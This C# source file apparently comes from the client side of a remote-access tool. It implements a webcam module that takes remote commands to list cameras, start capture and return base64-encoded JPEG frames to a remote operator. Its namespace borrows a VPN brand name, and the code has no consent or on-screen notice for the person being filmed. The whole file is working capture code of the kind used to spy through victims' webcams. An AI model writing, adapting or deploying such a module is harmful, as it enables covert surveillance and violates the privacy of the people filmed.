using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;

namespace mullvad.Module.RemoteWebcam
{
    public sealed class RemoteWebcamClientModule
    {
        public static string ModuleId => "mullvad.remotewebcam";

        private static WebcamHelper _helper;
        private static int          _fps     = 30;
        private static int          _quality = 75;
        private static readonly object _startLock = new object();

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "devices":      return Devices();
                    case "start_stream": return StartStream(payload);
                    case "get_frame":    return GetFrame();
                    case "stop_stream":  return StopStream();
                    default:             return Err("unknown action");
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // ── devices ───────────────────────────────────────────────────────────

        private static string Devices()
        {
            string[] names = WebcamHelper.GetWebcams();
            var sb = new StringBuilder("[");
            for (int i = 0; i < names.Length; i++)
            {
                if (i > 0) sb.Append(',');
                sb.Append("{\"id\":").Append(i)
                  .Append(",\"name\":\"").Append(EscJson(names[i])).Append("\"}");
            }
            sb.Append(']');
            return "{\"ok\":true,\"devices\":" + sb + "}";
        }

        // ── start_stream ──────────────────────────────────────────────────────

        private static string StartStream(string payload)
        {
            lock (_startLock)
            {
                // Stop any existing helper
                try { _helper?.StopWebcam(); } catch { }
                _helper = null;

                int device  = ParseInt(payload, "device",  0);
                _fps        = Clamp(ParseInt(payload, "fps",     30), 1, 60);
                _quality    = Clamp(ParseInt(payload, "quality", 75), 10, 100);

                var h = new WebcamHelper();
                h.StartWebcam(device); // throws on error
                _helper = h;
            }

            // Wait up to 3 seconds for first frame
            for (int i = 0; i < 30; i++)
            {
                if (_helper?.Width > 0) break;
                Thread.Sleep(100);
            }

            int w = _helper?.Width  ?? 0;
            int ht = _helper?.Height ?? 0;
            return "{\"ok\":true,\"width\":" + w + ",\"height\":" + ht + ",\"fps\":" + _fps + "}";
        }

        // ── get_frame ─────────────────────────────────────────────────────────

        private static string GetFrame()
        {
            var helper = _helper;
            if (helper == null || !helper.IsRunning)
                return "{\"ok\":false,\"reason\":\"not_streaming\"}";

            // Poll up to 200ms for a fresh frame
            Bitmap bmp = null;
            for (int i = 0; i < 20 && bmp == null; i++)
            {
                bmp = helper.GetLatestFrame();
                if (bmp == null) Thread.Sleep(10);
            }
            if (bmp == null) return "{\"ok\":false}";

            try
            {
                byte[] jpeg = Encode(bmp, _quality);
                int w = bmp.Width, h = bmp.Height;

                // Wire format: flags(1) + width(4) + height(4) + fps(4) + JPEG
                var pkt = new byte[13 + jpeg.Length];
                pkt[0] = 0;
                Buffer.BlockCopy(BitConverter.GetBytes(w),    0, pkt, 1,  4);
                Buffer.BlockCopy(BitConverter.GetBytes(h),    0, pkt, 5,  4);
                Buffer.BlockCopy(BitConverter.GetBytes(_fps), 0, pkt, 9,  4);
                Buffer.BlockCopy(jpeg, 0, pkt, 13, jpeg.Length);

                return "{\"ok\":true,\"w\":" + w + ",\"h\":" + h
                     + ",\"data\":\"" + Convert.ToBase64String(pkt) + "\"}";
            }
            finally
            {
                bmp.Dispose();
            }
        }

        // ── stop_stream ───────────────────────────────────────────────────────

        private static string StopStream()
        {
            lock (_startLock)
            {
                try { _helper?.StopWebcam(); } catch { }
                _helper = null;
            }
            return "{\"ok\":true}";
        }

        // ── helpers ───────────────────────────────────────────────────────────

        private static byte[] Encode(Bitmap bmp, int quality)
        {
            var encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
            ImageCodecInfo codec = GetJpegCodec();
            using var ms = new MemoryStream();
            bmp.Save(ms, codec, encParams);
            return ms.ToArray();
        }

        private static ImageCodecInfo GetJpegCodec()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
            return null;
        }

        private static int Clamp(int v, int lo, int hi) => v < lo ? lo : v > hi ? hi : v;

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k = "\"" + key + "\"";
            int idx = json.IndexOf(k); if (idx < 0) return def;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return def;
            int s = c + 1; while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-'; if (neg) s++;
            int e = s; while (e < json.Length && char.IsDigit(json[e])) e++;
            return e == s ? def : int.TryParse(json.Substring(s, e - s), out int v) ? (neg ? -v : v) : def;
        }

        private static string EscJson(string s)
        {
            var sb = new StringBuilder();
            foreach (char c in s)
            {
                if (c == '"') sb.Append("\\\"");
                else if (c == '\\') sb.Append("\\\\");
                else sb.Append(c);
            }
            return sb.ToString();
        }

        private static string Err(string msg) => "{\"error\":\"" + EscJson(msg) + "\"}";
    }
}
